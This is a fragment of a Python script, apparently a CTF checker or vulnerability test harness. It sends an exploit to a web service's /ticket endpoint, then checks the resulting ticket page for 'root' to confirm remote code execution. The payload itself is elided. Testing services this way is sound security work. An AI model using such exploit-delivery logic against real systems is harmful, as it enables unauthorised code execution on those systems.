        ...
        async with aiohttp.ClientSession(cookies=cookies) as session:
            ...
            async with session.post(f'http://{HOST}:{PORT}/ticket', data=data) as response:
                if response.status == 200:
                    print(Fore.GREEN + "[+] Exploit sent successfully" + Style.RESET_ALL)
                    async with session.get(f'http://{HOST}:{PORT}/profile') as profile_response:
                        if profile_response.status == 200:
                            ...
                            if ticket_link:
                                ...
                                print(Fore.GREEN + f"[+] Found ticket URL: {ticket_url}" + Style.RESET_ALL)
                                async with session.get(ticket_url) as ticket_response:
                                    ...
                                    if "root" in ticket_text:
                                        print(Fore.GREEN + "[+] RCE exploit confirmed!" + Style.RESET_ALL)
                                        return 101, None
                                    else:
                                        print(Fore.RED + "[-] RCE exploit not triggered" + Style.RESET_ALL)
                                        return 102, None
                            else:
                                print(Fore.RED + "[-] Ticket link not found in profile" + Style.RESET_ALL)
                                await delete_user_from_db(email)
                                return 110, None
                        else:
                            print(Fore.RED + f"[-] Can't get user profile: {profile_text}")
                            await delete_user_from_db(email)
                            return 110, None
                else:
                    print(Fore.RED + f"[-] Error sending exploit: {response.text}" + Style.RESET_ALL)
                    await delete_user_from_db(email)
                    return 110, None
